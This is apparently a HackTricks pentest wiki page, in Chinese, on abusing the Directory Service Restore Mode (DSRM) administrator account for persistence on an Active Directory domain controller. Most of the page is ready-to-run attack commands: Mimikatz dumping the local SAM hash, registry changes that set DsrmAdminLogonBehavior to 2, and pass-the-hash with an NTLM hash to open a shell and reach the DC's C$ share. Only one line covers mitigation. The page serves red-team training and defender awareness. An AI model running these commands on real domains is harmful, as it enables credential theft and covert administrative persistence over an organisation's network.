# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

每个 **DC** 中都有一个**本地管理员**账户。拥有此计算机上的管理员权限后，你可以使用 mimikatz **dump 本地 Administrator 的 hash**。然后修改注册表以**激活此密码**，这样你就可以远程访问此本地 Administrator 用户。\
首先，我们需要在 DC 中 **dump** **本地 Administrator** 用户的 **hash**：
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
然后我们需要检查该账户是否可用；如果注册表项的值为 "0" 或不存在，则需要**将其设置为 "2"**：
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
然后，使用 PTH，你可以**列出 C$ 的内容，甚至获取一个 shell**。注意，要使用内存中的该 hash 创建新的 powershell session（用于 PTH），所使用的“domain”只是 DC machine 的名称：
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
更多信息请参阅：[https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) 和 [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## 缓解措施

- 事件 ID 4657 - 审计 `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` 的创建/更改

## 参考资料

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
